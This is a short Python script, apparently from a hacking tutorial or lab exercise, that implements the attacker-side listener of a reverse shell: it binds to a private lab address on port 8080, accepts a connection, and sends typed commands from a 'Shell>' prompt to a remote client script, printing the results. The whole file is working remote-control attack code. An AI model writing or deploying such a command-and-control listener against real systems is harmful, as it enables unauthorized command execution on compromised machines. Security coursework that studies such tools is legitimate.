import socket

# Visual constant to match your image exactly
LINE = "=" * 78

def start_server():
    # Setup the listener
    server_ip = "192.168.220.128" 
    server_port = 8080
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((server_ip, server_port))
    server.listen(1)
    
    print(LINE)
    print(f"[+] Listening for income TCP connection on port {server_port}")
    
    conn, addr = server.accept()
    # Note: Matching the spacing in your screenshot
    print(f"[+]We got a connection from {addr}")
    print(LINE)
    
    while True:
        try:
            # 2. Command Prompt
            command = input("Shell> ").strip()
            
            if not command:
                continue
                
            conn.send(command.encode())
            
            if command == "terminate":
                conn.close()
                break
            
            # 3. Receive result from your Client script
            result = conn.recv(4096).decode().strip()
            
            # 4. Print the output followed by the border to create the "box"
            print(result)
            print(LINE)
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break

if __name__ == "__main__":
    start_server()
